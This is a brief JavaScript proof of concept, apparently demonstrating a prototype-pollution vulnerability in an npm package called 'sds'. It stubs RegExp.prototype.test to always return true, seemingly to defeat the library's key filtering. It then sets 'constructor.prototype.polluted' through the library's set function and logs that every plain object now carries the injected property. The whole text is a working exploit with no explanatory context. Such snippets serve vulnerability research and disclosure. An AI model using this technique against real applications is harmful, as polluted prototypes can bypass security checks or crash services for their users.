RegExp.prototype.test = () => true;
const root = require('sds');
obj = {};
let payload = 'constructor.prototype.polluted';
console.log({}.polluted);
root.set({}, payload, true);
console.log({}.polluted);